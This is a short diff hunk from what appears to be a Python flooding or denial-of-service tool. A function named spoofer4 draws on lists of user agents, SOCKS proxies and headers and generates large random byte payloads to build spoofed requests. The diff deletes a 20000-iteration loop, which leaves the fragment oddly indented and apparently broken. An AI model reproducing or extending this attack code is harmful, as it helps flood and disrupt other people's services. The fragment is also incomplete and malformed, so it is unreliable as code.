@@ -438,7 +438,6 @@ def start2():
 def spoofer4():
   global byte7, byte8, byte9
   global useragents, socks2, socks5, ref, acceptall
-for i in range(20000):
   byte8 = random._urandom(8901)
   byte9 = random._urandom(4455)
   Socks0 = random.choice(useragents)+random.choice(socks2)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
